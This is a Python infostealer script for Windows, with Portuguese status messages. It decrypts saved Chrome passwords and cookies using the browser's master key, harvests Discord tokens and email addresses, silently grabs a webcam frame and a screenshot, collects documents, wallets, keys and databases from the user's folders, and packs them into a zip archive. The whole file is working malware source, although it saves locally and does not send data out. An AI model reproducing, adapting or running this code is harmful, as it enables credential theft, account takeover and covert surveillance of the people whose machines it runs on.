import os
import json
import base64
import sqlite3
import shutil
import zipfile
import platform
import psutil
import cv2
import re
import pyautogui 
from datetime import datetime
import win32crypt 
from Crypto.Cipher import AES 

def get_master_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Erro ao obter chave mestra: {e}")
        return None

def decrypt_payload(cipher, master_key):
    if not master_key: return "Erro: Sem chave mestra"
    try:
        iv = cipher[3:15]
        payload = cipher[15:]
        cipher_aes = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher_aes.decrypt(payload)[:-16].decode()
    except:
        return "Erro descriptografia"

def extract_chrome_data():
    master_key = get_master_key()
    user_data_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data')
    results = []
    try:
        profiles = [d for d in os.listdir(user_data_path) if d.lower().startswith('profile ') or d.lower() == 'default']
        for profile in profiles:
            db_paths = {"Passwords": os.path.join(user_data_path, profile, 'Login Data'), "Cookies": os.path.join(user_data_path, profile, 'Network', 'Cookies')}
            for name, path in db_paths.items():
                if not os.path.exists(path): continue
                temp_db = f"temp_{os.urandom(4).hex()}.db"
                try:
                    shutil.copy2(path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    if name == "Passwords":
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for url, user, enc_pass in cursor.fetchall():
                            results.append(f"Chrome|{profile}|URL:{url}|User:{user}|Pass:{decrypt_payload(enc_pass, master_key)}")
                    elif name == "Cookies":
                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                        for host, name_c, enc_val in cursor.fetchall():
                            results.append(f"Cookie|{profile}|Host:{host}|Name:{name_c}|Val:{decrypt_payload(enc_val, master_key)}")
                    conn.close()
                except: pass
                finally:
                    if os.path.exists(temp_db): os.remove(temp_db)
    except Exception as e:
        print(f"Erro no Chrome: {e}")
    return results

def scan_tokens_and_secrets():
    patterns = {"Discord": r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', "Email": r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+'}
    found = []
    search_paths = [os.path.join(os.environ['APPDATA'], 'discord'), os.path.join(os.environ['LOCALAPPDATA'], 'Discord')]
    for path in search_paths:
        if not os.path.exists(path): continue
        for root, _, files in os.walk(path):
            for file in files:
                try:
                    with open(os.path.join(root, file), 'r', errors='ignore') as f:
                        content = f.read()
                        for label, regex in patterns.items():
                            for m in re.findall(regex, content): found.append(f"Secret|{label}|Val:{m}")
                except: pass
    return found

def capture_media():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret: cv2.imwrite("webcam.jpg", frame)
        cam.release()
    except: pass
    try:
        pyautogui.screenshot().save("screenshot.jpg")
    except: pass

def scan_all_files():
    targets = ['Documents', 'Desktop', 'Pictures', 'Videos', 'Downloads', 'Saved Games']
    exts = ('.pdf', '.docx', '.txt', '.xlsx', '.jpg', '.png', '.key', '.json', '.wallet', '.ini', '.db')
    found_files = []
    for target in targets:
        path = os.path.join(os.environ['USERPROFILE'], target)
        if os.path.exists(path):
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower().endswith(exts): found_files.append(os.path.join(root, file))
    return found_files

def main():
    print("Coletando dados...")
    try:
        results = []
        capture_media()
        results.append(f"OS: {platform.system()} | Node: {platform.node()}")
        results.extend(extract_chrome_data())
        results.extend(scan_tokens_and_secrets())
        files = scan_all_files()


        zip_path = os.path.join(r"C:\Users\uknow\Desktop\teste_malware", "evidence_full.zip")
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            with open("data.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(results))
            zipf.write("data.txt")
            if os.path.exists("webcam.jpg"): zipf.write("webcam.jpg")
            if os.path.exists("screenshot.jpg"): zipf.write("screenshot.jpg")
            for f_path in files:
                try:
                    zipf.write(f_path, os.path.relpath(f_path, os.environ['USERPROFILE']))
                except: pass

        print(f"Sucesso! Arquivo gerado em: {zip_path}")

    except Exception as e:
        print(f"Erro fatal: {e}")
    finally:
        for tmp in ["data.txt", "webcam.jpg", "screenshot.jpg"]:
            if os.path.exists(tmp):
                try:
                    os.remove(tmp)
                except:
                    pass

if __name__ == "__main__":
  try:
    main()
  except Exception as e:
    print(f"Erro fatal: {e}")
  finally:
    for tmp in ["data.txt", "webcam.jpg", "screenshot.jpg"]:
      if os.path.exists(tmp):
        try:
          os.remove(tmp)
        except:
          pass
